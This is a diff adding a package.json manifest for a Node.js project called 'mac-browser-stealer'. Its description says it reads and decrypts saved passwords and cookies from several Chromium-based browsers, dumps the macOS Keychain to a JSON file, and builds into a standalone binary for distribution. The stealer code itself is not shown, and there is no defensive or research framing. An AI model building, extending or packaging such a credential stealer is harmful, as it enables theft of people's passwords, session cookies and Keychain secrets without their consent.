@@ -1,0 +1,30 @@
+{
+  "name": "mac-browser-stealer",
+  "version": "1.0.0",
+  "description": "Zero-dependency macOS browser cookie + password stealer. Reads and decrypts Chrome/Edge/Brave/Chromium/Vivaldi/Opera cookies and saved passwords (plus a full Keychain dump) into a local JSON file. Compiles to a single standalone binary with pkg.",
+  "main": "stealer.js",
+  "bin": {
+    "mac-browser-stealer": "stealer.js"
+  },
+  "scripts": {
+    "start": "node stealer.js",
+    "build": "pkg . --targets node18-macos-arm64,node18-macos-x64 --output dist/mac-browser-stealer"
+  },
+  "license": "MIT",
+  "engines": {
+    "node": ">=18"
+  },
+  "pkg": {
+    "targets": [
+      "node18-macos-arm64",
+      "node18-macos-x64"
+    ],
+    "outputPath": "dist",
+    "assets": [
+      "lib/**/*"
+    ]
+  },
+  "devDependencies": {
+    "pkg": "^5.8.1"
+  }
+}
